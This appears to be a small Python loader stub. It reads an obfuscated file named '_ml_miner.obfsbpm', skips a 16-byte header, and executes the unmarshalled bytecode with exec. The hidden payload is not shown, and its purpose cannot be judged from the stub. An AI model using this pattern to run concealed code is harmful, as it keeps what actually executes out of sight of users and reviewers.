
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'file_obf', '_ml_miner.obfsbpm'), 'rb')
s.seek(16)
exec(marshal.load(s))
